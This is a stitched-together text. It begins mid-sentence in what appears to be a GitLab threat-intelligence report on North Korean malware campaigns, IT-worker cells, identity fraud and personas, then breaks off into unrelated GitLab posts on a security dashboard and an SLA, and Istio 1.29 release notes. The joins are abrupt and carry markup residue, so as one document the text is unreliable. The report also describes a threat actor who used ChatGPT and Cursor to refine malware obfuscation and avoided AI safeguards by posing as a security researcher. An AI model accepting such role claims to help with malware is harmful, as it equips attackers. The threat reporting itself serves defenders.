nation-state malware developer using AI to help develop a custom obfuscator for BeaverTail. Based on commit messages and project data, the developer used ChatGPT and Cursor (with an unknown model) to refine their obfuscator by testing whether AI was capable of de-obfuscating their code. Based on AI model responses, the threat actor was able to avoid triggering safeguards by posing as a security researcher attempting to analyze the malware. This demonstrates the broadly empowering nature of AI and the limits of safeguards in preventing use by motivated threat actors. We have not observed the BeaverTail variant the threat actor created in the wild.</p><p>In October 2025, a North Korean nation-state-controlled account submitted a support ticket to appeal a ban from GitLab.com for malware distribution. The threat actor, posing as the CTO of a newly created cryptocurrency organization, inquired about the reason for their ban and requested account reinstatement. We assess that this support ticket was likely an attempt to gather information about our detection methodology. We provided no information to the threat actor and also banned a subsequent account they created using the same CTO persona.</p><h3 id=\"implications\">Implications</h3><p>North Korean nation-state malware operations are atypical because of how much direct human effort is involved. The volume of manual effort by many operators presents a challenge to service providers because of the extreme diversity in techniques that emerges.</p><p>We observed an increasing emphasis on obfuscation and evasiveness in the second half of 2025, indicating that service provider disruptions are forcing an evolution in tactics. Despite this, we anticipate that North Korean nation-state malware campaigns will continue through 2026 due to the continued effectiveness of the campaign and the high value of developer endpoints to North Korean threat actors.</p><h3 id=\"mitigation\">Mitigation</h3><p>We banned 131 accounts associated with North Korean nation-state malware distribution in 2025. We’re grateful for the abuse reports we received from GitLab.com users, which helped us to track threat actors through infrastructure and technique shifts. We encourage GitLab.com users encountering malicious or suspicious content to continue to submit abuse reports using the abuse report functionality on user profile pages.</p><p>We improved our data collection and clustering of North Korean nation-state accounts and invested in new capabilities to identify threat actor infrastructure. We collaborated with industry partners to share our data, enabling the disruption of accounts on other platforms.</p><h2 id=\"case-studies\">Case studies</h2><h3 id=\"case-study-1-north-korean-it-worker-cell-manager-financial-and-administrative-records\">Case Study 1: North Korean IT Worker Cell Manager Financial and Administrative Records</h3><h4 id=\"summary\">Summary</h4><p>We identified a private project almost certainly controlled by Kil-Nam Kang (강길남), a North Korean national managing a North Korean IT worker cell. Kang maintained detailed financial and personnel records showing earnings of more than US$1.64 million between Q1 2022 and Q3 2025. Kang’s cell currently includes seven other North Korean nationals and generates revenue through freelance software development under false identities. We assess that the cell is highly likely colocated and operating from Beijing, China.</p><h4 id=\"key-findings-1\">Key findings</h4><p>In late 2025, we identified a private project containing financial records and administrative documents related to the operation of a North Korean IT worker cell. Detailed financial records span from Q1 2022 to Q3 2025, however less detailed records indicate the cell was operating as early as 2019.</p><p>We assess that the project is almost certainly controlled by North Korean national Kil-Nam Kang. Records indicate that Kang managed the cell as two subteams in 2022, however from 2023 onwards only tracked performance at the individual level. Kang maintains detailed personnel records, including dossiers on each team member, performance reviews, and copies of team members’ passports. Kang also has credentials to remotely access each cell member's workstation.</p><p><img alt=\"Assessed organization chart of the North Korean IT worker cell managed by Kil-Nam Kang.\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769692342/zasqtzdr3xpq9wgqh6a1.png\" title=\"Assessed organization chart of the North Korean IT worker cell managed by Kil-Nam Kang.\" /></p><p>Personnel dossiers list each of the cell members as “베이징주재 김일성종합대학 공동연구중심 연구사”, translating to “Researcher at Kim Il-sung University Joint Research Center in Beijing”. This designation suggests that the cell’s presence in China may be under an academic pretext. Kang generally accessed GitLab.com via Astrill VPN, however we also observed origination from China Unicom IP addresses geolocated to Beijing, most recently <code>111.197.183.74</code>.</p><p>Dossiers list devices and accounts owned by each cell member, including passwords to access accounts. Dossiers list from two to four “대방관계” (“bilateral relations”) for each cell member. We assess that these bilateral relations almost certainly include active facilitators, however may also include inadvertent facilitators or victims of identity theft. Bilateral relations span countries including the U.S., Canada, Mexico, Panama, the U.K., France, Spain, Sweden, Montenegro, Russia, China, Thailand, Indonesia, Malaysia, Philippines, Sri Lanka, Argentina, Chile, and Peru. The project contains other data on bilateral relations, including identity documents, banking information, and credentials to remotely access devices and accounts.</p><p>Financial records indicate that the cell generates revenue through freelance and contract software development services. The cell maintains detailed notes linking each software development project to a facilitator persona. These notes include samples of communication styles and notes on facilitator circumstances and temperaments to enable cell members to switch between projects if required. The cell focused on web and mobile app development.</p><p>Software development clients pay the cell via digital payment processors. Withdrawal receipts indicate that cell members withdraw funds from payment platforms into Chinese banks. The cell maintained organized banking records, including digital images of Chinese Resident Identity Cards, which are required to access the Chinese financial system. The cell maintained individual records for at least three Chinese banks. One Chinese Resident Identity Card relates to a North Korean national who is not a member of the cell.</p><p><img alt=\"Screenshot of project spreadsheet showing deposits and withdrawal from virtual bank accounts, dated November 2025.

Reports compare team member earnings against predefined targets and quarter-over-quarter performance. The comprehensiveness and highly structured nature of financial reports is indicative of regular financial monitoring and reporting to leadership.</p><p><img alt=\"Screenshot of presentation showing cell performance data for Q3 2025.\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769692846/kepq0zhevybpfrdnkg3t.png\" title=\"Screenshot of presentation showing cell performance data for Q3 2025.\" /></p><p><img alt=\"Screenshot of presentation showing cell member performance relative to goals for Q3 2025.\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769692964/mwsgg1hs3zqgddibaxsy.png\" title=\"Screenshot of presentation showing cell member performance relative to goals for Q3 2025.\" /></p><p><img alt=\"Screenshot of presentation showing cell performance data by month for Q3 2025.\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769693162/eilplgjpnrlh1mln1l67.png\" title=\"Screenshot of presentation showing cell performance data by month for Q3 2025.\" /></p><p>We aggregated financial data and identified a total reported income of US$1.64 million from Q1 2022 to Q3 2025. The cell had a target of US$1.88 million over the same period. The cell averaged approximately US$117,000 per quarter, approximately US$14,000 per member excluding Kang. The cell produced the highest earnings in the first half of 2022 and lowest earnings in Q3 2025.</p><p><img alt=\"Actual and target cell earnings over time, 2022 to 2025.\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769693321/e4okiye7ucr0gge28wle.png\" title=\"Actual and target cell earnings over time, 2022 to 2025.\" /></p><p>We assess that cell income goals were likely set based on a combination of prior earnings and cell membership. In Q3 2025, cell member Won-Jin Kim was dropped from tracking and his documentation was shifted to a directory marked “귀국” (“Return to the home country”). We assess that Won-Jin Kim’s departure from the cell is unlikely to relate to revenue generation performance based on consistently high earnings relative to other members.</p><p>The private project also contained performance reviews for cell members, dated 2020. These performance reviews confirm that the cell is physically colocated and include commentary about cell members’:</p><ul><li>Earnings contribution and mutual skills development.</li><li>Voluntary donations for Typhoon Bavi and COVID-19 recovery in North Korea.</li><li>Contributions to collective household duties, including doing laundry, providing haircuts, and purchasing shared food and drink.</li><li>Interpersonal values and adherence to party values.</li></ul><p>These reviews suggest that the cell operates as a tightly controlled collective household where individual performance encompasses both revenue generation and ideological conformity. We observed instances of a cell member communicating with an unknown party by continually overwriting an HTML comment hidden in a large decoy codebase. The other party appeared to be able to communicate with North Korea, and provided the cell member with information about personal matters and the international movements of mutual contacts. This communication method was unique to this exchange and may have been an attempt by the cell member to evade surveillance by their superiors.</p><p><img alt=\"Commit showing a cell member communicating with an unknown party to pass on messages from inside North Korea.\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769694080/cxenda3rxohgwbbrddz2.png\" title=\"Commit showing a cell member communicating with an unknown party to pass on messages from inside North Korea.\" /></p><h4 id=\"implications-1\">Implications</h4><p>This activity provides a unique view into the financial operations and organizational structure of a North Korean IT worker cell. Records demonstrate that these operations function as structured enterprises with defined targets and operating procedures and close hierarchical oversight. This cell’s demonstrated ability to cultivate facilitators globally provides a high degree of operational resiliency and money laundering flexibility.</p><p>The declining earnings trend through 2025 may reflect a changing landscape due to increased public awareness of North Korean IT worker activities. Despite this decline, the cell had earnings exceeding US$11,000 per member in Q3 2025, demonstrating a clear capability to generate funds for the regime.</p><h4 id=\"mitigations\">Mitigations</h4><p>We banned accounts related to this activity.</p><h3 id=\"case-study-2-synthetic-identity-creation-and-service-abuse-at-scale\">Case Study 2: Synthetic Identity Creation and Service Abuse at Scale</h3><h4 id=\"summary-1\">Summary</h4><p>We identified a North Korean nation-state software development team collaborating on a large-scale synthetic identity creation capability. The capability included functionality to scrape images and personal data, generate fake passports, and automate email and professional networking accounts to generate leads. The threat actors also developed tools to synchronize Git repositories and created copies of proprietary code they gained access to. This activity cluster created a minimum of 135 synthetic identities purporting to originate from Eastern Europe and Southeast Asia. Using these personas, the actor gained access to at least 48 private codebases.</p><h4 id=\"key-findings-2\">Key findings</h4><p>We identified a set of projects contributed to by a North Korean nation-state activity cluster focused on capability development and large scale synthetic identity creation. The cluster included 10 distinct GitLab accounts or Git identities that exhibited concurrent activity or had distinct origins, leading us to assess that the activity cluster highly likely comprised at least a small team of developers. Accounts commonly originated from Virtual Private Servers but intermittently originated from Russian IP space. The development team commenced activities in 2021 but was most active from late-2024 to mid-2025.</p><p>The threat actor developed a complex multistage process to generate synthetic identities at scale. The overall flow of the threat actor’s identity creation capability was to:</p><ol><li>Scrape photographs from social media, AI image generators, and other platforms.</li><li>Use the legitimate faceswapper.ai service to create novel images by swapping faces from diverse source images into headshot-style images suitable for identity documents.</li><li>Generate passports with fake personal information using VerifTools and newly created headshots. VerifTools is an illicit fraudulent identity document service <a href=\"https://www.justice.gov/usao-nm/pr/us-government-seizes-online-marketplaces-selling-fraudulent-identity-documents-used\" rel=\"\">disrupted by U.S. authorities in August 2025</a>. Downloaded passports contained watermarks because the threat actor did not pay for VerifTools.</li><li>Use an automated Adobe Photoshop routine stored in a .atn file to extract and remove VerifTools watermarks.</li><li>Create accounts on email and professional networking sites. The threat actor used fake passports to seek enhanced identity verification on professional networking sites.</li></ol><p>The threat actor’s tooling to interact with abused services was brokered through a control node hosted at <code>185.92.220.208</code>. This control node served a custom API that allowed individual operators to remotely create, monitor, and control individual accounts. The threat actor used web browsers instrumented with Selenium to interact with abused services. The threat actor primarily automated accounts to make connections and cold contact leads to generate software engineering work.</p><p>The threat actor used a combination of dedicated, IPRoyal, and open proxies to obfuscate their activities and stored a massive volume of solutions to animal/object matching CAPTCHA challenges to facilitate bypasses in automated scripts. The control node tracked the efficacy of the threat actor’s accounts, contact scripts, and infrastructure, allowing the threat actor to monitor campaign effectiveness and adapt its techniques over time through an administrative dashboard.</p><p>The threat actor stored working data on dedicated infrastructure or in cloud storage accounts rather than on GitLab.com. However, in September 2024, the threat actor inadvertently committed a dump of its database to GitLab.com. The database contained records of profiles controlled at that time, which was early in the development of the capability. The contents of some fields in the database were encrypted, however the server-side decryption routine code stored on GitLab.com contained a hard-coded key, allowing us to decrypt the data.</p><p>As of September 2024, the threat actor controlled 135 synthetic identities. Identities most commonly purported to be based in Serbia, but also purportedly originated from Poland, Philippines, Indonesia, Bulgaria, Croatia, Romania, Lithuania, Moldova, Hungary, and Slovakia. For each account, the threat actor stored information about whether identity verification was successful, with overall results indicating the threat actor was successful in just over 40% of verification attempts. Commit volume on the synthetic identity capability escalated sharply from September 2024 to December 2024, indicating that the true scale of the threat actor’s activities may have been much higher. The threat actor also had more than 73,000 leads stored in its database dump, providing insight into the scope of its outbound activities.</p><p><img alt=\"Distribution of purported account origins\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769694425/igefe8soxgg1gt2lfasy.png\" /></p><p><img alt=\"Distribution of identity verification results\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769694350/liucfviexwkxy028ysyf.png\" /></p><p>The threat actor also created a set of command line tools for standardized Git operations.  The tooling was primarily intended to allow the threat actor to mirror Git repositories from private namespaces on a range of cloud and self-managed source code management systems. The tooling allowed the threat actor to push commits to the mirror and then have them synchronized to remote repositories under the correct Git identities. This capability gave the threat actor a safety net against making commits under the wrong identity and also meant that they exfiltrated copies of codebases they gained access to. Based on metadata reports committed to GitLab.com by the threat actor, they used this mirroring tooling on at least 48 unique repositories.</p><h4 id=\"implications-2\">Implications</h4><p>This cluster is notable among North Korean nation-state activity we observed in 2025 due to the strong focus on automation and continued efficacy monitoring. This cluster also demonstrates that North Korean nation-state threat actors draw on both emerging AI capabilities and the cybercrime ecosystem to enhance their operations.</p><p>Identity development is a fundamental element of North Korean nation-state insider activity. North Korean nation-state threat actors incrementally build legitimacy through identities spanning multiple platforms and by seeking enhanced verification services where possible. North Korean nation-state identity cultivation draws on network effects by creating interactions, reviews and testimonials between personas. These tactics have the drawback of increasing threat actors’ exposure to service provider takedowns. Organizations should treat applications with dead links to professional profiles and source code portfolios as highly suspicious.</p><h4 id=\"mitigations-1\">Mitigations</h4><p>We banned the accounts associated with this activity and notified impacted service providers of potential abuse of their platforms.</p><h3 id=\"case-study-3-north-korean-operator-controlling-21-personas\">Case Study 3: North Korean Operator Controlling 21 Personas</h3><h4 id=\"summary-2\">Summary</h4><p>We identified an individual North Korean operator controlling at least 21 distinct personas based on real identities. The threat actor was focused on revenue generation through contract and freelance software development. The threat actor’s personas spanned five countries and were supported by doctored identity documents and personal information obtained from open sources and through a likely cyber intrusion.</p><h4 id=\"key-findings-3\">Key findings</h4><p>We identified a code project used by an individual North Korean operator active from at least May 2021 until February 2025. The threat actor was focused on generating revenue through contract and freelance software development under a range of stolen or shared identities, spanning at least 21 distinct personas. The threat actor focused on web, blockchain, and cloud skill sets, and created blogs and professional social media accounts on various external platforms. The threat actor typically accessed GitLab.com via commercial VPNs and Virtual Private Servers with RDP enabled. Based on lapses in proxy use, the threat actor was likely physically located in Russia during early 2025.</p><p>The threat actor maintained individual directories for each identity, containing identity documents, resumes, signatures, personal information, and payment card information. The threat actor’s identities spanned the U.S., Canada, Ukraine, Estonia, and Macedonia. For five of their eight U.S.-based identities, the threat actor used Photoshop to edit their own image into one or more stolen identity documents, preserving otherwise valid details. The threat actor produced false Florida and Texas driver licenses and false U.S. passports. The threat actor had Photoshop Document (PSD) template files to produce identity documents for Australia, Austria, Canada, Finland, Germany, Malaysia, Mexico, Philippines, and Poland. We identified some of these template files for sale via illicit services online and assess that the threat actor likely purchased the templates.</p><p><img alt=\"Doctored U.S. identity documents containing the threat actor’s photograph.\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769694685/rof3zsajd7asn8lcq0oc.png\" title=\"Doctored U.S. identity documents containing the threat actor’s photograph.\" /></p><p>The threat actor also collected personal information on U.S.-based individuals. The threat actor had files that appear to have been exported from the HR management system of a large U.S.-based hospitality company. The files contained information including personal and contact details, protected class status, and identity document numbers for almost 8,000 employees of the organization. We were unable to locate this data in circulation or data breach aggregators, suggesting that the data may have been obtained by the threat actor during an intrusion or purchased in a one-off sale. The threat actor also had an export of the public Florida voter registration database, which is one of the most detailed publicly available voter databases.</p><h4 id=\"implications-3\">Implications</h4><p>This threat actor’s activities suggest that North Korean threat actors place a particular value on U.S. identities. We identified no evidence that the threat actor altered non-U.S. identity documents or collected personal data from any other country. This activity also demonstrates that North Korean threat actors, even when focused on earning wages, present a cyber intrusion risk and actively leverage the cybercrime ecosystem to support their operations.</p><h4 id=\"mitigation-1\">Mitigation</h4><p>We banned the account associated with this operator.</p><h3 id=\"case-study-4-north-korean-fake-it-worker-operating-from-central-moscow\">Case Study 4: North Korean Fake IT Worker Operating from Central Moscow</h3><h4 id=\"summary-3\">Summary</h4><p>We identified a private code repository used by a North Korean fake IT worker likely operating from central Moscow. The threat actor was focused on cultivation of a smaller group of more detailed personas and progressed from freelance work to full-time employment. The threat actor also attempted to recruit remote facilitators to maintain custody of laptops intended to be remotely accessed.</p><h4 id=\"key-findings-4\">Key findings</h4><p>We identified a private code project controlled by a North Korean fake IT worker most recently active in December 2025. We identified the project within a week of its creation, however the threat actor's records indicate they have been active on other platforms since at least 2022. The threat actor started as a freelance software developer and 3D modeler but shifted focus to seeking fraudulent full-time employment in 2025. The threat actor’s strategy relied on a smaller number of personas with emphasis on establishing legitimacy through backstopping rather than relying on many disposable personas.</p><p>Repository contents indicate that the threat actor began as a fraudulent freelancer. Invoices created by the threat actor during this period were marked payable to individuals and addresses in China, Poland, and Spain. Documents stored by the threat actor indicate that they rotated through accounts on at least three payment processors to receive payments from clients. A spreadsheet stored by the threat actor indicates they were part of a 14-member cell in 2022, however they did not store continuous financial records on GitLab.com. North Korean cells we have observed on GitLab.com typically have smaller membership and this is the only data we have observed consistent with a cell membership exceeding 10.</p><p>In early 2025, the threat actor pivoted to attempting to obtain full-time employment at U.S. and U.K. organizations. In March 2025, the threat actor uploaded chat logs to GitLab.com containing exchanges with another likely North Korean operator. The threat actors discussed their progress in recruiting individuals in the U.S. and U.K. to maintain custody of laptops to be remotely accessed in exchange for a fixed fee and the payment of power and internet utilities. The primary threat actor mentioned having a current facilitator based in Hong Kong providing remote access to a device and sharing their identity and a potential facilitator in the U.K. The primary threat actor represented himself as a Chinese national with visa difficulties when attempting to recruit facilitators.</p><p>In April 2025, the threat actor operationalized the Hong Kong-based facilitator and started seeking employment. The threat actor circulated a set of resumes with different skill sets on resume-sharing sites and on a personal portfolio website. The threat actor took a series of photographs of themselves and used several AI-headshot services to create professional profile photos.</p><p><img alt=\"Original and AI-enhanced images of the threat actor stored in private projects and open-source examples claiming employment at two U.S.-based organizations.\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1769694925/spifmjjmsbod8nczsi6n.png\" title=\"Original and AI-enhanced images of the threat actor stored in private projects and open-source examples claiming employment at two U.S.-based organizations.\" /></p><p>The threat actor uploaded the original images used to create their AI headshots to GitLab.com. The images contained EXIF metadata, including GPS coordinate data. GPS coordinates stored on the images indicate that they were taken at <code>55°43'44.4&quot;N 37°36'55.8&quot;E</code>, which is a location in the Yakimanka District in central Moscow. We note that these coordinates were highly likely produced via Windows location services based on WiFi positioning and may have a reduced accuracy compared to true GPS. Despite this limitation, we assess that it is highly likely that this threat actor was based in Moscow when the images were captured on April 18, 2025.

The threat actor appears to have gained significant access to the agency, including privileged access to web hosts used for client projects and potential access to an executive’s Slack account. The threat actor stored copies of the executive’s resume and message logs indicating that the threat actor may represent themselves as the executive in communications with external parties. We are unable to assess whether this is an instance of facilitation or the threat actor using their foothold to establish deeper control of the agency.</p><h4 id=\"implications-4\">Implications</h4><p>This incident is an example of a North Korean fake IT worker cultivating a small number of detailed personas. This approach is distinct from other operators that focus on a higher volume of disposable personas.</p><p>This incident also provides insight into North Korean facilitator cultivation. The threat actors were content to seek purely technical facilitators rather than facilitators willing to share their identities and participate in meetings. This preference suggests that North Korean operators prioritize circumventing technical controls such as IP address-based geolocation and reputation scoring over identity verification challenges, indicating that technical controls may be a more significant operational barrier in the current landscape.</p><h4 id=\"mitigations-2\">Mitigations</h4><p>We banned the account associated with this activity.</p><p><em>Saksham Anand contributed to this report.</em></p><h2 id=\"appendix-1-gitlab-threat-intelligence-estimative-language\">Appendix 1: GitLab Threat Intelligence Estimative Language</h2><p>We use specific language to convey the estimated probability attached to assessments.

North Korean threat actors almost certainly use compromised and purchased identities to support their operations, meaning these indicators of compromise may not be uniquely malicious or may have reverted to their original owners. We have made our best efforts to filter for email addresses where threat actors have indicated positive control of the email address on one or more platforms or represented themselves as the associated identity.</p><table><thead><tr><th align=\"left\">Indicator</th><th align=\"left\">Type</th><th align=\"left\">Risk</th><th align=\"left\">First Seen</th><th align=\"left\">Last

      "summary": "<p>Security teams and developers face the same frustration: thousands of vulnerabilities demanding attention, without the insights to help them prioritize remediation. Where is risk concentrated and how fast is it being remediated? Where will remediation efforts have the greatest impact? The updated GitLab Security Dashboard helps answer these questions with trend tracking, vulnerability age distribution, and risk scoring by project.</p><h2 id=\"measure-remediation-not-just-detection\">Measure remediation, not just detection</h2><p>Application security teams don’t struggle to find vulnerabilities; they struggle to make sense of them. Most dashboards show raw counts without context, forcing teams to spend countless hours chasing remediation without understanding what vulnerabilities expose them to the greatest risks.</p><p><a href=\"https://docs.gitlab.com/user/application_security/security_dashboard/#new-security-dashboards\" rel=\"\">GitLab Security Dashboard</a> consolidates all vulnerability data into one view that spans projects, groups, and business units.</p><p>In 18.6, we introduced the first release of the updated Security Dashboard, allowing teams to view vulnerabilities over time and filter based on project or report type. As part of the <a href=\"https://about.gitlab.com/releases/2026/02/19/gitlab-18-9-released/\" rel=\"\">18.9 release</a>, customers will be able to take advantage of new filters and charts that make it easier to slice data by severity, status, scanner, or project and visualize trends such as open vulnerabilities, remediation velocity, vulnerability age distribution, and risk score over time.</p><p>Risk scores help teams prioritize remediating their most critical vulnerabilities. The risk score is calculated using factors such as vulnerability age, Exploit Prediction Scoring System (EPSS), and Known Exploited Vulnerability (KEV) scores for related repositories and their security postures. With this data, application security teams can pinpoint which areas need more attention than others.</p><p>GitLab Security Dashboard helps application security and development teams:</p><ul><li><strong>Track program effectiveness</strong>: Monitor remediation velocity, scanner adoption, and risk posture to show measurable improvement.</li><li><strong>Focus on targeted remediation</strong>: Fix vulnerabilities that represent the greater risk to production systems.</li><li><strong>Identify areas for remediation training</strong>: Find which teams struggle with remediating vulnerabilities in accordance with company policy to invest in additional training.</li><li><strong>Reduce manual reporting</strong>: Eliminate the need for external dashboards and spreadsheets by tracking everything directly within GitLab.</li></ul><p>This update reflects GitLab’s continued commitment to making security measurable, contextual, and integrated into everyday development workflows. GitLab Security Dashboard turns raw findings into actionable insights, giving security and development teams the clarity to prioritize, reduce risk faster, and prove their progress.</p><h2 id=\"see-security-dashboard-in-action\">See Security Dashboard in action</h2><p>An application security leader preparing for an executive briefing can now show whether investments are reducing risk with clear trendlines: open vulnerabilities decreasing, vulnerability age decreasing, once-prevalent CWE types trending downward, and a healthy risk score. Instead of presenting raw counts, they can demonstrate how the backlog is shrinking and how risk posture is improving quarter over quarter.</p><p>At the same time, developers can see the same dashboard highlighting critical vulnerabilities in their active projects, allowing them to focus remediation efforts without exporting data or juggling multiple tools.</p><blockquote><p>For more details on how to get started with GitLab Security Dashboard today, check out our <a href=\"https://docs.gitlab.com/user/application_security/security_dashboard/\" rel=\"\">documentation</a>.</p></blockquote>",

This commitment ensures your DevSecOps workflows have the reliability they need.</p><h2 id=\"we-value-your-trust\">We value your trust</h2><p>Modern software delivery operates at a velocity where teams push code, open merge requests, and track issues continuously throughout the day. Git operations — push, pull, clone — happen thousands of times per hour across distributed teams. When any of these core experiences become unavailable, your entire software delivery workflow stops.</p><p>The 99.9% availability service-level agreement (SLA) ensures your accelerated development pace doesn't hit infrastructure walls. Service credits demonstrate our accountability — tying our success to platform reliability and aligning our interests with yours. We hold ourselves accountable to your business outcomes, not just availability targets.</p><p>GitLab's SLA commitment covers the core platform services essential to your DevSecOps workflows.</p><p>At launch, the covered experiences are:</p><p>* Issues and merge requests<br />\n* Git operations (push, pull, clone via HTTPS and SSH)<br />\n* Container Registry operations<br />\n* Package Registry operations<br />\n* API requests (limited to the above)</p><p>The most up-to-date list of covered and excluded experiences is available in the <a href=\"https://handbook.gitlab.com/handbook/engineering/infrastructure-platforms/service-level-agreement/#covered-experiences\" rel=\"\">GitLab handbook</a>.</p><p>Service availability is measured using automated monitoring across multiple geographic locations, providing an accurate representation of actual service availability experienced by customers.

Server errors are defined as HTTP 5xx status codes or connection timeouts exceeding 30 seconds as determined by GitLab's internal and external monitoring systems.</p><p>The SLA measures server-side failures, but some issues may not trigger 5xx errors, such as application bugs that make features unusable, Sidekiq job processing outages, or infrastructure problems that degrade performance without failing requests outright.</p><p>Here’s how you can claim service credits when applicable:</p><ol><li>Submit a support request at support.gitlab.com within thirty (30) days after the end of the affected month to claim downtime credits.</li><li>The GitLab team reviews the claim, validates the downtime, and processes the credit if applicable.</li><li>Service credits will be applied against your next issued invoice.</li></ol><p><a href=\"https://handbook.gitlab.com/handbook/engineering/infrastructure-platforms/service-level-agreement/#calculating-monthly-uptime-percentage\" rel=\"\">Read the handbook</a> for more on how monthly uptime availability is calculated, the service credits offered when applicable, and the credit claim procedures.</p><p>While our monitoring is designed to capture the vast majority of service disruptions, if your experience doesn't match reported availability, we encourage you to submit a service credit claim. GitLab will review the claim holistically, including investigating issues that may not be reflected in automated monitoring.</p><h2 id=\"reliability-you-can-count-on\">Reliability you can count on</h2><p>The 99.9% availability SLA with service credits represents our commitment to being a reliable foundation for your software delivery workflows.

versions 1.31 to 1.35.</div>\n    </aside>\n</div>\n\n<h2 id=\"whats-new\">What&rsquo;s new?</h2>\n<h3 id=\"ambient-mesh-production-ready-enhancements\">Ambient Mesh Production-Ready Enhancements</h3>\n<p>Istio 1.29 adds two operational improvements enabled by default for ambient mesh: DNS capture is now enabled by default for ambient workloads, improving security and performance while enabling advanced features like better service discovery and traffic management. This enhancement ensures that DNS traffic from ambient workloads is properly proxied through the mesh infrastructure.</p>\n<p>Additionally, iptables reconciliation is now enabled by default, providing automatic network rule updates when the istio-cni <code>DaemonSet</code> is upgraded. This eliminates the manual intervention previously required to ensure existing ambient pods receive updated networking configuration, making ambient mesh operations more seamless and reliable for production environments.</p>\n<h3 id=\"enhanced-security-posture\">Enhanced Security Posture</h3>\n<p>This release adds security enhancements across multiple components. Certificate Revocation List (CRL) support is now available in ztunnel, allowing validation and rejection of revoked certificates when using plugged in certificate authorities. This strengthens the security posture of service mesh deployments using external CAs.</p>\n<p>Debug endpoint authorization is enabled by default, providing namespace based access controls for debug endpoints on port 15014. Non system namespaces are now restricted to specific endpoints (<code>config_dump</code>, <code>ndsz</code>, <code>edsz</code>) and same namespace proxies only, improving security without impacting normal operations. <em>Special thanks to Sergey KANIBOR at Luntry for reporting the debug endpoint authorization issue.</em></p>\n<p>Optional NetworkPolicy deployment is now available for istiod, istio-cni, and ztunnel components, enabling users to deploy default <code>NetworkPolicies</code> with <code>global.networkPolicy.enabled=true</code> for enhanced network security.</p>\n<h3 id=\"tls-traffic-management-for-wildcard-hosts\">TLS Traffic Management for Wildcard Hosts</h3>\n<p>Istio 1.29 introduces alpha support for wildcard hosts in <code>ServiceEntry</code> resources with <code>DYNAMIC_DNS</code> resolution specifically for TLS traffic. Enables routing based on SNI (Server Name Indication) from TLS handshakes without terminating the TLS connection to inspect Host headers.</p>\n<p>While this feature has important security implications due to potential SNI spoofing, it provides powerful capabilities for managing external TLS services when used with trusted clients. The feature requires explicit enablement via the <code>ENABLE_WILDCARD_HOST_SERVICE_ENTRIES_FOR_TLS</code> feature flag.</p>\n<h3 id=\"performance-and-observability-improvements\">Performance and Observability Improvements</h3>\n<p>HTTP compression for Envoy metrics is now enabled by default, providing automatic compression (<code>brotli</code>, <code>gzip</code>, and <code>zstd</code>) for the Prometheus stats endpoint based on client <code>Accept-Header</code> values. This reduces network overhead for metrics collection while maintaining compatibility with existing monitoring infrastructure.</p>\n<p>Baggage based telemetry support has been added in alpha for ambient mesh, particularly benefiting multinetwork deployments. When enabled via the <code>AMBIENT_ENABLE_BAGGAGE</code> pilot environment variable, this feature ensures proper source and destination attribution for cross-network traffic metrics, improving observability in complex network topologies.</p>\n<h3 id=\"simplified-operations-and-resource-management\">Simplified Operations and Resource Management</h3>\n<p>Istio 1.29 introduces pilot resource filtering capabilities through the <code>PILOT_IGNORE_RESOURCES</code> environment variable, enabling administrators to deploy Istio as a Gateway API only controller or with specific resource subsets. This is particularly valuable for GAMMA (Gateway API for Mesh Management and Administration) deployments.</p>\n<p>Memory management has been improved with <code>istiod</code> now automatically setting <code>GOMEMLIMIT</code> to 90% of memory limits (via the <code>automemlimit</code> library), reducing the risk of OOM kills while maintaining optimal performance. Circuit breaker metrics tracking is now disabled by default, improving proxy memory usage while maintaining the option to enable legacy behavior when needed.</p>\n<h3 id=\"inference-extension-support-promoted-to-beta\">Inference Extension Support Promoted to Beta</h3>\n<p>Support for the <a href=\"https://gateway-api-inference-extension.sigs.k8s.io/\">Gateway API Inference Extension</a> has been promoted to beta in Istio 1.29. The inference extension is an official Kubernetes project that utilizes a new <code>InferencePool</code> CRD object, along with existing Kubernetes Gateway API traffic management objects (<code>Gateway</code>, <code>HTTPRoute</code>), in order to optimize the serving of self-hosted Generative AI models in Kubernetes.</p>\n<p>Istio 1.29 is conformant with the <code>v1.0.1</code> version of the inference extension, and is available to try by enabling the <code>ENABLE_GATEWAY_API_INFERENCE_EXTENSION</code> pilot environment variable. Future releases of Gateway API Inference Extension will be supported in upcoming versions of Istio.</p>\n<p>See <a href=\"https://istio.io/docs/tasks/traffic-management/ingress/gateway-api-inference-extension/\">our guide</a> and <a href=\"https://istio.io/blog/2025/inference-extension-support/\">original blog post</a> in order to get started.</p>\n<h3 id=\"multi-network-multicluster-ambient-goes-beta\">Multi-network multicluster ambient goes Beta</h3>\n<p>This release also promotes multi-network multicluster in ambient to beta status. Lots of improvements were made for robustness and completeness. The main area of focus for this transition was telemetry, where important gaps were addressed, including the implementation of more advanced peer metadata exchange in the ambient data-plane.</p>\n<p>This means some confusing cases in multinetwork telemetry were addressed. In scenarios where Waypoints wouldn&rsquo;t be properly reported in L4 metrics to cases where peer information was not fully available for requests traversing different networks through an E/W Gateway.</p>\n<p>Also, we now have <a href=\"https://istio.io/docs/ambient/install/multicluster/observability/\">a quick guide</a> showing how to deploy Prometheus and Kiali for multi-network multicluster in ambient mode.</p>\n<p>Note that some of these improvements may also be behind the <code>AMBIENT_ENABLE_BAGGAGE</code> feature flag mentioned in the sections above, so make sure to enable it if you want to try them out. If you need more information on how to deploy multi-network multicluster using the ambient data-plane, please follow <a href=\"https://istio.io/docs/ambient/install/multicluster/multi-primary_multi-network/\">this guide</a>.

